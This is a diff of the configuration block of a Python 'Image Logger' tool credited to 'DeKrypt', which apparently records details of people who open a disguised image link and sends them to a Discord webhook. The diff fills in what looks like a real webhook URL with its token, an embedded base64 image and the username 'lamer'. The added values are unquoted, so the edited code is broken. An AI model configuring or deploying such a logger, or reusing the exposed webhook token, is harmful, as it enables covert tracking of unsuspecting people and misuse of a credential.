@@ -10,13 +10,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": https://discord.com/api/webhooks/1252320199001243799/cBrHwCab2S_nHasApBgNrXPz6Bzy5xWwuUthXhwvTGWZxeQh7m22kv9RB7Ymfc5jCATx
+    "image": data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAJ1BMVEX///8AAAC/v79NTU37+/vExMTg4ODLy8tcXFxPT087OzuPj48XFxe0Xey8AAAB2UlEQVR4nO3dQW7iQBRF0RRgbJPsf73do47UGeRJLvSQOWcBX/9K2B5V8fEBnMttuR+ecV9uEzZ5lnVsh2dsY52wybNcxvXwjOu4TNjkWRQmFHYpTCjsUphQ2KUwobBLYUJhl8KEwi6FCYVdChMKuxQmFHYpTCjsUphQ2KUwobBLYUJhl8KEwi6FCYVdChMKuxQmFHYpTCjsUphQ2KUwobBLYUJhl8KEwi6FCYVdy9gPz9jHMmGT/9zWyxTL53gcHvIYn8uEXf5av68uWMY5ff8Y7tt1iv0xvvb92Ij9azyOjfhnO36FxQ+XKc/hK79p3qHw7F8LhQmFXQoTCrsUJhR2KUwo7FKYUNilMKGwS2FCYZfChMIuhQmFXQoTCrsUJhR2KUwo7FKYUNilMKGwS2FCYZfChMIuhQmFXQoTCrsUJhR2KUwo7HqHs2svWnj+M6TnPwd8/rPc07zsefxp3uFrofB3CrsUJhR2KUwo7FKYUNilMKGwS2FCYZfChMIuhQmFXQoTCrsUJhR2KUwo7FKYUNilMKGwS2FCYZfChMIuhQmFXQoTCrsUJhR2KUwo7FKYUNilMKGwS2FCYZfChMKudWyHZ2xjnbDJs9yW43/2fV+ecFEAUPUHgbYVyTozlqoAAAAASUVORK5CYII=, # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "lamer", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
